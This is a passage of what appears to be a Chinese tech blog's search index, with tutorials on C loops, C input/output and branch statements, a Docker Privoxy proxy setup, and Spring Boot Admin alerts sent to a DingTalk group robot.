"Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c语言"},{title:"C 语言语法之三循环控制结构",url:"/posts/e2f81b63.html",text:'循环控制结构循环结构循环结构是程序中一种很重要的结构。其特点是，在给定条件成立时，反复执行某程序段，直到条件不成立为止。给定的条件称为循环条件，反复执行的程序段称为循环体。C 语言提供了多种循环语句，可以组成各种不同形式的循环结构，分别是： 用 for 语句 用 while 语句 用 do-while 语句 用 goto 语句和 if 语句构成循环 goto 语句 goto 语句是一种无条件转移语句，与 BASIC 中的 goto 语句相似，goto 语句的使用格式为：goto 语句标号; 其中标号是一个有效的标识符，这个标识符加上一个 : 一起出现在函数内某处，执行 goto 语句后，程序将跳转到该标号处并执行其后的语句。另外标号必须与 goto 语句同处于一个函数中，但可以不在一个循环层中。通常 goto 语句与 if 条件语句连用，当满足某一条件时，程序跳到标号处运行 必须注意，goto 语句通常不建议使用，因为它将使程序层次不清，且不易读，但在多层嵌套退出时，用 goto 语句则比较合理 123456789101112/*******使用goto语句和if语句构成循环*******/int main(){ int i=1,sum=0; loop: if (i&lt;=100) { sum=sum+i; i++; goto loop; } printf("%d\\n",sum);} while 语句 while 语句的一般形式为：while (表达式) 语句，其中表达式是循环条件，语句为循环体。while 语句的语义是：计算表达式的值，当值为真（非 0）时，则执行循环体语句，其执行过程可用下图表示： while 语句中的表达式一般是关系表达或逻辑表达式，只要表达式的值为真 (非 0)，即可继续循环 循环体如包括有一个以上的语句，则必须用 {} 括起来，组成复合语句 注意：如果 while 循环的表达式的值一开始就为 0，则循环语句一次也会被不执行 1234567891011121314151617181920212223242526/*******使用while语句构成循环*******/int main(){ int i=1,sum=0; while(i&lt;=100) { sum=sum+i; i++; } printf("%d\\n",sum);}/*******下面的while循环永远不会退出（死循环）*******/int main(){ int i=1,sum=0; while(i&lt;=100) // ｝ sum=sum+i; i++; // } printf("%d\\n",sum);}// 因为上面的while循环体没有使用{}括起来，i++不属于while循环体内的一部分，导致了死循环的发生 do-while 语句 do-while 语句的一般形式为：do 语句 while(表达式);，这个循环与 while 循环的不同在于，它先执行循环中的语句，然后再判断表达式是否为真，如果为真则继续循环；如果为假，则终止循环。因此，do-while 循环至少要执行一次循环语句 1234567891011/*******使用do-while语句构成循环*******/int main(){ int i=1,sum=0; do { sum=sum+i; i++; } while(i&lt;=100); printf("%d\\n", sum);} for 语句 在 C 语言中，for 语句使用最为灵活，它完全可以取代 while 语句，它的一般形式为：for (表达式 1；表达式 2；表达式 3) 语句 for 语句的执行过程如下： 123451. 先求解表达式12. 求解表达式2，若其值为真（非0），则执行for语句中指定的内嵌语句，然后执行下面第3步；若其值为假（0），则结束循环，转到第5步3. 求解表达式34. 转回上面第2步继续执行5. 循环结束，执行for语句下面的一个语句 for 语句最简单的应用形式也是最容易理解的形式是：for (循环变量赋初值；循环条件；循环变量增量) 语句；其中循环变量赋初值总是一个赋值语句，它用来给循环控制变量赋初值；循环条件是一个关系表达式，它决定什么时候退出循环；循环变量增量，定义循环控制变量每循环一次后按什么方式变化。这三个部分之间用 ; 分开，具体示例如下： 1234for(i=1; i&lt;=100; i++){ sum=sum+i;} for 语句的使用注意事项 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253i. for循环中的“表达式1（循环变量赋初值）”、“表达式2(循环条件)”和“表达式3(循环变量增量)”都是可选择项，即可以缺省，但“；”不能缺省ii. 若三个表达式都省略了，此时 for(;;) 语句相当于 while(1) 语句iii. 省略了“表达式1（循环变量赋初值）”，表示不对循环控制变量赋初值iiii. 可省略“表达式1（循环变量赋初值）”和“表达式3(循环变量增量)”，例如：for(;i&lt;=100;){ sum=sum+i; i++;}iiiii. 省略了“表达式2(循环条件)”，则不做其它处理时便成为死循环，例如：for(i=1;;i++){ sum=sum+i;}iiiiii. 省略了“表达式3(循环变量增量)”，则不对循环控制变量进行操作，这时可在循环体中加入修改循环控制变量的语句，例如：for(i=1;i&lt;=100;){ sum=sum+i; i++;}iiiiiii. 表达式1可以是设置循环变量的初值的赋值表达式，也可以是其他表达式，例如：for(sum=0;i&lt;=100;i++){ sum=sum+i;}iiiiiiii. 表达式1和表达式3可以是一个简单表达式也可以是逗号表达式，例如:for(sum=0,i=1;i&lt;=100;i++){{ sum=sum+i;}或者：for(i=0,j=100;i&lt;=100;i++,j--){ k=i+j;}iiiiiiiii. 表达式2一般是关系表达式或逻辑表达式，但也可是数值表达式或字符表达式，只要其值非零，就会执行循环体，例如：for(i=0;(c=getchar())!=\'\\n\';i+=c){ printf("%c",c);}或者：for(;(c=getchar())!=\'\\n\';){ printf("%c",c);} 四种循环语句的比较 四种循环都可以用来处理同一问题，一般情况下它们可以互相代替，但一般不提倡用 goto 型循环 在 while 循环和 do-while 循环中，都是在 while 后面的括号内指定循环条件，因此为了使循环能正常结束，应在循环体中包含使循环趋于结束的语句 (如 i++，或 i=i+1 等) for 循环可以在表达式 3 中包含使循环趋于结束的操作，甚至可以将循环体中的操作全部放到表达式 3 中，因此 for 语句的功能更强；凡是用 while 循环能完成的功能，for 循环都能实现 用 while 和 do-while 循环时，循环变量初始化的操作应在 while 和 do-while 语句之前完成，而 for 语句可以在表达式 1 中实现循环变量的初始化 while 循环、do-while 循环和 for 循环，都可以用 break 语句跳出循环，用 continue 语句结束本次循环；而对用 goto 语句和 if 语句构成的循环，不能用 break 语句和 continue 语句进行控制 break 语句 break 语句可以用来从循环体内跳出循环体，即提前结束循环，然后接着执行循环下面的语句，一般形式：break; break 语句不能用于循环语句和 switch 语句之外的任何其他语句中 break 语句对 if-else 的条件语句不起作用 在多层循环中，一个 break 语句只向外跳一层 continue 语句 continue 语句的作用是结束本次循环，即跳过循环体中下面尚未执行的语句，接着进行下一次是否执行循环的判定。一般形式：continue; continue 语句和 break 语句的区别是，continue 语句只结束本次循环，而不是终止整个循环的执行；break 语句则是结束整个循环过程，不再判断执行循环的条件是否成立 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c语言"},{title:"Docker 安装 Privoxy 代理服务",url:"/posts/1b7c9c6f.html",text:'安装环境介绍 环境名称 版本 linux CentOS Linux release 7.7.1908 (Core) docker-ce 19.03.8 docker-compose 1.24.0-rc1 docker image vimagick/privoxy:latest 初始目录结构 目录结构 12345~/fig/privoxy/├── docker-compose.yml└── privoxy/ ├── user.action └── user.filter 文件：docker-compose.yml 123456789101112131415version: "3.5"services: privoxy: image: vimagick/privoxy:latest container_name: privoxy ports: - 8118:8118 volumes: - ./privoxy/user.action:/etc/privoxy/user.action - ./privoxy/user.filter:/etc/privoxy/user.filter cap_add: - NET_ADMIN restart: always 文件：user.action，以下的配置内容，作用是阻止 Privoxy 指向服务器本身的 IP 和域名，需要替换为你自己服务器的 IP 和域名。 1234{+block{block ip and domain which point to server itself}}127.0.0.145.32.57.113.example.com 文件：user.filter，该文件用于存放 Privoxy 的过滤规则，暂时不需要填写任何内容。 1 启动 Privoxy 服务12345678910111213141516171819# 进入目标目录# cd ~/fig/privoxy/# 创建并启动容器# docker-compose up -d# 打印日志信息$ docker-compose logs# 若输出的日志信息如下，则说明Privoxy的代理服务启动成功Attaching to privoxyprivoxy | 2020-03-27 22:49:28.383 7f30fa6aed48 Info: Privoxy version 3.0.28privoxy | 2020-03-27 22:49:28.383 7f30fa6aed48 Info: Program name: privoxyprivoxy | 2020-03-27 22:49:28.384 7f30fa6aed48 Info: Loading filter file: /etc/privoxy/default.filterprivoxy | 2020-03-27 22:49:28.386 7f30fa6aed48 Info: Loading filter file: /etc/privoxy/user.filterprivoxy | 2020-03-27 22:49:28.386 7f30fa6aed48 Info: Loading actions file: /etc/privoxy/match-all.actionprivoxy | 2020-03-27 22:49:28.386 7f30fa6aed48 Info: Loading actions file: /etc/privoxy/default.actionprivoxy | 2020-03-27 22:49:28.389 7f30fa6aed48 Info: Loading actions file: /etc/privoxy/user.actionprivoxy | 2020-03-27 22:49:28.389 7f30fa6aed48 Info: Listening on port 8118 on IP address 0.0.0.0 创建 Privoxy 的主配置文件123456789101112131415161718192021222324# 进入目标目录# cd ~/fig/privoxy# 拷贝容器中的config文件到本地磁盘（前提是容器已正常启动）# docker cp privoxy:/etc/privoxy/config ./privoxy/config# 文件授权# chmod 644 ./privoxy/config# 编辑docker-compose的配置文件，添加以下内容来挂载本地的config文件# vim docker-compose.ymlvolumes: - ./privoxy/config:/etc/privoxy/config# 重启容器让配置变更生效# docker-compose restart# 最终的目录结构~/fig/privoxy/├── docker-compose.yml└── privoxy/ ├── config ├── user.action └── user.filter 限制访问来源（可选步骤）Privoxy 支持 IP 白名单的功能，配置示例如下： 123456789# 进入目标目录# cd ~/fig/privoxy# 编辑config文件，在文件末尾添加一行内容（IP需要根据自己的实际情况进行修改）# vim ./privoxy/configpermit-access 14.215.177.38/26# 重启容器让配置变更生效# docker-compose restart 开放防火墙端口（Centos7）12345678# 开放Privoxy监听的8118端口# firewall-cmd --zone=public --permanent --add-port=8118/tcp# 保存防火墙配置# firewall-cmd --reload# 查看防火墙已开放的端口# firewall-cmd --list-ports 验证代理服务是否可用 在 Docker 容器内验证 123456789101112131415# 执行以下命令，若返回200状态码，则说明代理服务可用# curl -I -x 127.0.0.1:8118 www.baidu.comHTTP/1.1 200 OKAccept-Ranges: bytesCache-Control: private, no-cache, no-store, proxy-revalidate, no-transformConnection: keep-aliveContent-Length: 277Content-Type: text/htmlDate: Fri, 27 Mar 2020 01:39:09 GMTEtag: "575e1f6f-115"Last-Modified: Mon, 13 Jun 2016 02:49:08 GMTPragma: no-cacheServer: bfe/1.0.8.18Proxy-Connection: keep-alive 在其他 Linux 系统上验证 1234567891011121314# 执行以下命令，若返回200状态码，则说明代理服务可用# curl -I -x 45.32.57.113:8118 www.baidu.comHTTP/1.1 200 OKAccept-Ranges: bytesCache-Control: private, no-cache, no-store, proxy-revalidate, no-transformConnection: keep-aliveContent-Length: 277Content-Type: text/htmlDate: Fri, 27 Mar 2020 01:40:09 GMTEtag: "575e1f60-115"Last-Modified: Mon, 13 Jun 2016 02:50:08 GMTPragma: no-cacheServer: bfe/1.0.8.18Proxy-Connection: keep-alive 常见问题Privoxy 拒绝连接Privoxy 默认绑定的地址 127.0.0.1:8118，如果主机的 hostname 不是 localhost 或者 127.0.0.1，则需要更改 Privoxy 的主配置文件，重新配置 listen-address 参数。 查看 hostname 1# hostname 更改监听地址 1234# 编辑配置文件，更改监听地址# vim /etc/privoxy/configlisten-address yourHostName:8118 重新验证代理 1# curl -I -x yourHostName:8118 www.baidu.com 参考资料 vimagick/privoxy var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"C 语言语法之二顺序程序与分支结构程序设计",url:"/posts/b27b9a6a.html",text:'赋值语句 注意在变量声明中给变量赋初值和赋值语句的区别，给变量赋初值是变量声明的一部分，赋初值后的变量与其后的其它同类变量之间仍必须用逗号间隔，而赋值语句则必须用分号结尾，例如：int a=5,b,c; 在变量声明中，不允许连续给多个变量赋初值，而赋值语句则允许连续赋值，如 int a=b=c=5; 声明是错误的，正确的写法必须是：int a=5,b=5,c=5; 注意赋值表达式和赋值语句的区别，赋值表达式是一种表达式，它可以出现在任何允许表达式出现的地方，而赋值语句则不能，如 if((x=y+5)&gt;0) z=x; 语句是合法的，if((x=y+5;)&gt;0) z=x; 语句是非法的，因为 x=y+5; 是语句，不能出现在表达式中 putchar 函数与 getchar 函数 使用 putchar 和 getchar 函数前，都必须要用文件包含命令 #include &lt;stdio.h&gt; 或 #include “stdio.h” putchar 函数是字符输出函数，功能是在显示器上输出单个字符，其一般形式为：putchar (字符变量)，如 putchar(\'A\'); getchar 函数的功能是从键盘上输入一个字符，其一般形式为：getchar ()，通常把输入的字符赋予一个字符变量来构成赋值语句，如：char c = getchar(); putch 函数与 getch 函数 getch 函数是一个不回显函数，当用户按下某个字符时，函数自动读取，无需按回车；有的 C 语言命令行程序会用到此函数做游戏，但是这个函数并非标准函数，要注意不同平台的移植性 Windows 系统使用 putch 和 getch 函数，需要引入 ‘conio.h’ 头文件；在使用 getch 函数之前要调用 initscr()，结束时要调用 endwin()，否则会出现不输入字符这个函数也会有返回值的情况 在不同的系统平台，输入回车，getch 函数将返回不同数值，而 getchar 函数统一返回十进制数 10 (即 \\n) Linux 系统不存在 conio.h 头文件，但可以使用 curses 库替代；若在编译的时候不通过，gcc 编译命令需要添加 -l curses 参数来引入 curses 库。Linux 系统下只能使用 getch 函数，而 putch 函数不能使用，因为 curses 库里没有 putch 函数 printf 函数（格式输出函数） printf 函数称为格式输出函数，其关键字最末一个字母 f 即为 “格式”(format) 之意。其功能是按用户指定的格式，把指定的数据显示到显示器屏幕上。该函数是一个标准库函数，它的函数原型在头文件 stdio.h 中，但作为一个特例，不要求在使用 printf 函数之前必须包含 stdio.h 文件，其调用的一般形式为：printf (“格式控制字符串”，输出表列) 其中格式控制字符串用于指定输出格式，格式控制串可由格式字符串和非格式字符串两种组成。格式字符串是以 % 开头的字符串，在 % 后面跟有各种格式字符，以说明输出数据的类型、形式、长度、小数位数等，如：%c 表示按字符型输出，%d 表示按十进制整型输出，%f 表示按小数形式输出单精度实数 1234i. 类型：具体类型如下表所示ii. 长度：长度格式符为h、l两种，h表示按短整型量输出，l表示按长整型量输出iii. 输出最小宽度：用十进制整数来表示输出的最少位数，若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0iiii. 输出精度：精度格式符以`.`开头，后面跟十进制整数，本项的意义是如果输出数字，则表示小数的位数；如果输出的是字符，则表示输出字符的个数；若实际位数大于所定义的精度数，则截去超过的部分 1234567891011/printf函数使用例子/int a = 15;char d = \'p\';int x = 88, y = 89;float b = 123.1234567;double c = 12345678.1234567;printf("%c,%c\\n",x,y); // &gt;&gt; X, Yprintf("a=%d,%5d,%o,%x\\n",a,a,a,a); // &gt;&gt; a=15, 15,17,fprintf("b=%f,%lf,%5.4lf,%e\\n",b,b,b,b); // &gt;&gt; b=123.123459,123.123459,123.1235,1.231235e+02printf("c=%lf,%f,%8.4lf\\n",c,c,c); // &gt;&gt; c=12345678.123457,12345678.123457,12345678.1235printf("d=%c,%8c\\n",d,d); // &gt;&gt; d=p, p scanf 函数（格式输入函数） scanf 函数称为格式输入函数，即按用户指定的格式从键盘上把数据输入到指定的变量之中。该函数是一个标准库函数，它的函数原型在头文件 stdio.h 中，与 printf 函数相同，C 语言也允许在使用 scanf 函数之前不必包含 stdio.h 文件。scanf 函数的一般形式为：scanf (“格式控制字符串”，地址表列)，其中格式控制字符串的作用与 printf 函数相同，如：int a,b; scanf("%d%d",&amp;a,&amp;b);，但不能显示非格式字符串，也就是不能显示提示字符串。地址表列中给出各变量的地址，地址是由地址运算符 &amp; 后跟变量名组成，例如：&amp;a、 &amp;b 分别表示变量 a 和变量 b 的地址 格式控制字符串的一般形式为：%[*][输入数据宽度][长度] 类型，其中有方括号 [ ] 的项为任选项，各项的意义如下：1234i. *符号：用以表示该输入项读入后不赋予相应的变量，即跳过该输入值，例如: scanf("%d %*d %d", &amp;a, &amp;b)，当输入为：1 2 3 时，将把1赋予a，2被跳过，3赋予bi. 宽度：用十进制整数指定输入的宽度(即字符数)，例如：scanf("%5d", &amp;a)，当输入为：12345678，只把12345赋予变量a，其余部分被截去；又如：scanf("%4d%4d", &amp;a, &amp;b)，当输入为：12345678，将把1234赋予a，而把5678赋予biii. 长度：格式符为l和h，h表示输入短整型数据，l表示输入长整型数据（如%ld） 和双精度浮点数（如%lf）iiii. 类型：表示输入数据的类型，其格式符和意义和printf函数相同，如：d表示输入十进制整数 使用 scanf 函数必须注意以下几点：123456i. 若输入的数据与输出的类型不一致时，虽然编译能够通过，但输出结果可能不正确ii. scanf函数中没有精度控制，如：scanf("%5.2f", &amp;a) 是非法的，不能企图用此语句输入小数为2位的实数iii. scanf中要求给出变量地址，如给出变量名则会出错，如 scanf("%d", a) 是非法的，应改为 scanf("%d", &amp;a) 才是合法的iiii. 在输入多个数值数据时，若格式控制串中没有非格式字符作为输入数据之间的间隔，则可用空格、TAB或回车作间隔；C编译器在碰到空格、TAB、回车或非法数据（如对“%d”输入“12A”，A即为非法数据）时，即认为数据输入结束iiiii. 如果格式控制串中有非格式字符，则输入时也要输入该非格式字符，例如：scanf("%d,%d,%d", &amp;a, &amp;b, &amp;c)，其中用非格式符“,”作间隔符，则输入数据应为：5,6,7，又如：scanf("a=%d,b=%d,c=%d", &amp;a, &amp;b, &amp;c)，则输入数据应为：a=5,b=6,c=7iiiiii. 在输入字符数据时，若格式控制串中无非格式字符，则认为所有输入的字符均为有效字符，如：scanf("%c%c%c", &amp;a, &amp;b, &amp;c)，当输入为：d e f，则把\'d\'赋予a，\' \'赋予b，\'e\'赋予c，只有当输入为：def 时，才能把\'d\'赋于a，\'e\'赋予b，\'f\'赋予c。如果在格式控制中加入空格作为间隔，如：scanf("%c %c %c", &amp;a, &amp;b, &amp;c)，则输入时各数据之间可加空格，a、b、c也将会被赋予正确的值 关系运算符及其优先级关系运算符都是双目运算符，其结合性均为左结合，分别是 &lt;、&lt;=、&gt;、&gt;=、==、!=。关系运算符的优先级低于算术运算符，高于赋值运算符。在六个关系运算符中，前四个 &lt;、&lt;=、&gt;、&gt;= 的优先级相同，且高于 ==、!= 的优先级、而 ==、!= 的优先级相同。 关系表达式 关系表达式的一般形式为：表达式 关系运算符 表达式，例如：a+b &gt; c-d、x &gt; 3/2、-i-5*j == k+1。由于表达式也可以又是关系表达式，因此也允许出现嵌套的情况，例如：a &gt; (b&gt;c)、a != (c==d) 关系表达式的值是” 真” 和 “假”，分别使用 “1” 和 “0” 表示，例如：5 &gt; 0 的值为 “真”，即为 1，又如：(a=3) &gt; (b=5) 由于 3 &gt; 5 不成立，故其值为” 假”，即为 0 逻辑运算符及其优先级 C 语言中提供了三种逻辑运算符：&amp;&amp;（与运算）、||（或运算）、!（非运算），其中与运算符 &amp;&amp; 和或运算符 || 均为双目运算符，具有左结合性。非运算符 ! 为单目运算符，具有右结合性。三种逻辑运算符的优先级是如下图（最高处的运算符级别最高） 逻辑运算的值也分为 “真” 和 “假” 两种，用 “1” 和 “0 ” 来表示。其求值规则如下，与运算符 &amp;&amp;： 参与运算的两个量都为真时，结果才为真，否则为假，例如：5&gt;0 &amp;&amp; 4&gt;2，由于 5&gt;0 为真，4&gt;2 也为真，相与的结果也为真。或运算符 ||： 参与运算的两个量只要有一个为真，结果就为真，两个量都为假时，结果为假，例如：5&gt;0 || 5&gt;8 由于 5&gt;0 为真，相或的结果也就为真。非运算符 !： 参与运算量为真时，结果为假，参与运算量为假时，结果为真，例如：!(5&gt;0) 的结果为假 逻辑表达式 逻辑表达式的一般形式为：表达式 逻辑运算符 表达式，其中的表达式可以又是逻辑表达式，从而组成了嵌套的情形。例如：(a &amp;&amp; b) &amp;&amp; c，根据逻辑运算符的左结合性，也可写为：a &amp;&amp; b &amp;&amp; c if 语句if 语句可以构成分支结构，它根据给定的条件进行判断，以决定执行某个分支程序段，C 语言的 if 语句有三种基本形式： 第一种形式为：if (表达式) 语句，其语义是：如果表达式的值为真，则执行其后的语句，否则不执行该语句 第二种形式为: if-else 第三种形式为：if-else-if，前两种形式的 if 语句一般都用于两个分支以下的情况，当有多个分支选择时，可采用 if-else-if 语句 使用 if 语句应注意的问题 为了避免这种二义性，C 语言规定，else 总是与它前面最近的 if 配对 在 if 语句中，条件判断表达式必须用括号括起来，在语句之后必须加分号 在 if 语句的三种形式中，所有的语句应为单个语句，如果要想在满足条件时执行一组（多个）语句，则必须把这一组语句用 {} 括起来组成一个复合语句，但是在 } 之后不能再加分号 在三种形式的 if 语句中，在 if 关键字之后均为表达式，该表达式通常是逻辑表达式或关系表达式，但也可以是其它表达式，如赋值表达式等，甚至也可以是一个变量。例如：if(a=5) 语句、if(b) 语句 都是合法的，只要表达式的值为非 0，即为 “真” 条件运算符与条件表达式 条件运算符为 ? 和 :，它是一个三目运算符，即有三个参与运算的量。由条件运算符组成条件表达式的一般形式为：表达式 1? 表达式 2: 表达式 3，其求值规则为：如果表达式 1 的值为真，则以表达式 2 的值作为条件表达式的值，否则以表达式 3 的值作为整个条件表达式的值 条件表达式通常用于赋值语句之中，例如条件语句：if(a&gt;b) max=a; else max=b;，可用条件表达式改写为 max=(a&gt;b)?a:b;，执行该语句的语义是：如 a&gt;b 为真，则把 a 赋予 max，否则把 b 赋予 max 条件运算符的运算优先级低于关系运算符和算术运算符，但高于赋值符，因此 max=(a&gt;b)?a:b 可以去掉括号而写为 max=a&gt;b?a:b。条件运算符？和：是一对运算符，不能分开单独使用，其结合方向是自右至左 switch 语句 C 语言还提供了另一种用于多分支选择的 switch 语句，其一般形式为： 1234567switch(表达式){ case 常量表达式: 语句1; case 常量表达式: 语句2; ... case 常量表达式: 语句n; default: 语句n+1;} 其语义是计算表达式的值，并逐个与其后的常量表达式值相比较，当表达式的值与某个常量表达式的值相等时，则执行其后的语句，然后不再进行判断，继续执行后面所有 case、default 后的语句（没有使用 break 关键字的时候） 在使用 switch 语句时还应注意以下几点： 12345i. default子句可以省略不用ii. 在case后的各常量表达式的值不能相同，否则会出现错误iii. 在case后，允许有多个语句，可以不用{}括起来，但建议使用{}括起来iiii. 各case和default子句的先后顺序可以变动，而不会影响程序执行结果 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c语言"},{title:"Spring Boot Admin 集成钉钉群机器人报警通知",url:"/posts/e728f445.html",text:'前言实现流程创建钉钉群机器人后，得到 Webhook 与 Secret。Java 代码 实现 Admin 的 Notifier 接口，当监听到 Admin 服务状态变更后，直接调用 Webhook 发送消息给钉钉群机器人，群成员就可以收到报警消息通知，这个过程与 Github 的 Webhook 实现流程一致。 钉钉官方文档 钉钉官方文档 - 自定义机器人接入 钉钉官方文档 - 自定义机器人接入界面 值得一提的是，本文使用的是钉钉提供的 自定义机器人 接口，而不是 开发企业内部机器人 接口，同时 Webhook 里包含的 access_token 不存在有效期（永久有效），即不需要定时刷新 access_token。 创建钉钉群机器人首先登录钉钉的 PC 版，创建钉钉群机器人，得到钉钉群机器人的 Webhook；在群机器人的安全设置页面，若选择加签名，加签一栏下面还可以获取到 SEC 开头的字符串（签名秘钥）。 Admin 集成钉钉群机器人通知Java 核心代码钉钉群机器人的配置类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import org.springframework.beans.factory.annotation.Value;import org.springframework.context.annotation.Configuration;@Configurationpublic class DingTalkConfig { /** * 是否启用钉钉群机器人通知（默认否） */ @Value("${notify.dingtalk.enable:false}") private boolean robotEnable; /** * 钉钉群机器人所给URL后面的access_token参数值 */ @Value("${notify.dingtalk.access-token:}") private String accessToken; /** * 钉钉群机器人的签名秘钥 */ @Value("${notify.dingtalk.sign-secret:}") private String signSecret; /** * 是否加签名（默认是） */ @Value("${notify.dingtalk.enable-signature:true}") private boolean enableSignature; public boolean isRobotEnable() { return robotEnable; } public String getAccessToken() { return accessToken; } public String getSignSecret() { return signSecret; } public boolean isEnableSignature() { return enableSignature; }} 钉钉群机器人的消息类型枚举类 12345678910111213141516171819202122232425262728293031public enum DingTalkMessageType { TEXT("text", "文本消息"), LINK("link", "链接消息"), MARK_DOWN("markdown", "MarkDown消息"), FEED_CARD("feedCard", "FeedCard消息"), ACTION_CARD("actionCard", "ActionCard消息"); private String value; private String name; DingTalkMessageType(String value, String name) { this.value = value; this.name = name; } public String getValue() { return value; } public String getName() { return name; }} 钉钉群机器人的常量类 123456789public class DingTalkConstants { public static final String SERVER_URL = "https://oapi.dingtalk.com"; public static final String API_SEND_MESSAGE = SERVER_URL + "/robot/send?access_token=%s"; public static final String API_SEND_MESSAGE_SIGN = SERVER_URL + "/robot/send?access_token=%s&amp;timestamp=%s&amp;sign=%s";} 钉钉群机器人的消息发送类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118import cn.hutool.core.codec.Base64;import com.dingtalk.api.DefaultDingTalkClient;import com.dingtalk.api.DingTalkClient;import com.dingtalk.api.request.OapiRobotSendRequest;import com.monitor.notify.config.DingTalkConfig;import com.monitor.notify.constants.DingTalkConstants;import com.monitor.notify.enums.DingTalkMessageType;import com.taobao.api.TaobaoResponse;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.boot.autoconfigure.condition.ConditionalOnExpression;import org.springframework.stereotype.Component;import javax.crypto.Mac;import javax.crypto.spec.SecretKeySpec;import java.net.URLEncoder;/** * 钉钉群机器人消息发送&lt;br&gt; * 每个钉钉群机器人每分钟最多发送20条，如果超过20条，会限流10分钟&lt;br&gt; * 支持多种消息类型，发起POST请求时，必须将字符集编码设置成UTF-8&lt;br&gt; */@Component@ConditionalOnExpression("${notify.dingtalk.enable:false}")public class DingTalkMessageSender { private static final Logger logger = LoggerFactory.getLogger(DingTalkMessageSender.class); private DingTalkConfig dingTalkConfig; public DingTalkMessageSender(DingTalkConfig dingTalkConfig) { this.dingTalkConfig = dingTalkConfig; } /** * 发送文本消息 * * @param msgText 消息内容 * @return */ public boolean sendTextMessage(String msgText) { String logContent = msgText.replace(" ", "").replace("\\n", ""); try { logger.info("钉钉群机器人发送Text消息： {}", logContent); DingTalkClient client = new DefaultDingTalkClient(getUrl()); OapiRobotSendRequest.Text text = new OapiRobotSendRequest.Text(); text.setContent(msgText); OapiRobotSendRequest request = new OapiRobotSendRequest(); request.setMsgtype(DingTalkMessageType.TEXT.getValue()); request.setText(text); TaobaoResponse response = client.execute(request); return response.isSuccess(); } catch (Exception e) { logger.error("钉钉群机器人发送Text消息失败 : {} : {}", logContent, e.getLocalizedMessage()); } return false; } /** * 发送Markdown消息 * * @param title 标题 * @param msgText 消息内容 * @return */ public boolean sendMarkdownMessage(String title, String msgText) { String logContent = msgText.replace(" ", "").replace("\\n", ""); try { logger.info("钉钉群机器人发送Markdown消息： {}", logContent); DingTalkClient client = new DefaultDingTalkClient(getUrl()); OapiRobotSendRequest.Markdown markdown = new OapiRobotSendRequest.Markdown(); markdown.setTitle(title); markdown.setText(msgText); OapiRobotSendRequest request = new OapiRobotSendRequest(); request.setMsgtype(DingTalkMessageType.MARK_DOWN.getValue()); request.setMarkdown(markdown); TaobaoResponse response = client.execute(request); return response.isSuccess(); } catch (Exception e) { logger.error("钉钉群机器人发送Markdown消息失败 : {} : {}", logContent, e.getLocalizedMessage()); } return false; } /** * 获取URL * * @return * @throws Exception */ private String getUrl() throws Exception { String accessToken = dingTalkConfig.getAccessToken(); if (!dingTalkConfig.isEnableSignature()) { return String.format(DingTalkConstants.API_SEND_MESSAGE, accessToken); } else { Long timestamp = System.currentTimeMillis(); String sign = getSign(timestamp, dingTalkConfig.getSignSecret()); return String.format(DingTalkConstants.API_SEND_MESSAGE_SIGN, accessToken, timestamp, sign); } } /** * 获取签名 * * @param timestamp 时间戳 * @param secret 钉钉群机器人的签名秘钥 * @return * @throws Exception */ private String getSign(Long timestamp, String secret) throws Exception { String stringToSign = timestamp + "\\n" + secret; Mac mac = Mac.getInstance("HmacSHA256"); mac.init(new SecretKeySpec(secret.getBytes("UTF-8"), "HmacSHA256")); byte[] signData = mac.doFinal(stringToSign.getBytes("UTF-8")); return URLEncoder.encode(new String(Base64.encode(signData)), "UTF-8"); }} 消息通知模板类 123456789101112131415161718192021public class MessageTemplate { /** * 默认的监控消息模板 */ public static final String MONITOR_TEXT_TEMPLATE = "服务名: %s（%s） \\n服务状态: %s（%s） \\n服务 IP: %s \\n发送时间: %s"; /** * 钉钉群机器人的MarkDown监控消息模板 */ public static final String MONITOR_MARKDOWN_TEMPLATE_DINGTALK = "**服务名称：**\\n\\n" + "%s（%s）\\n\\n" + "**服务状态：**\\n\\n" + "%s（%s）\\n\\n" + "**服务IP：**\\n\\n" + "%s\\n\\n" + "**发送时间：**\\n\\n" + 